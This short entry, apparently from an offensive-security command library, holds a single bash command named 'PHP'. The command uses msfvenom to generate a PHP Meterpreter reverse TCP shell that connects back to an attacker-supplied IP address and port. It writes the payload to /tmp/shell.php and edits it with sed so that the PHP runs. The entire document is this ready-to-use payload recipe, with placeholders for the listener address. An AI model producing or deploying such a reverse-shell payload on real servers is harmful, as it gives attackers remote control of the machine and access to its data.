---
id: 0163e127-4470-4ab1-a0fd-8c39811cb4f2
name: PHP
type: command
executor: bash
data: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f raw > /tmp/shell.php && sed -i ''s/#<?php/<?php/'' /tmp/shell.php

  '
output: null
created_at: '2020-07-14T18:14:34.234712+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php

```


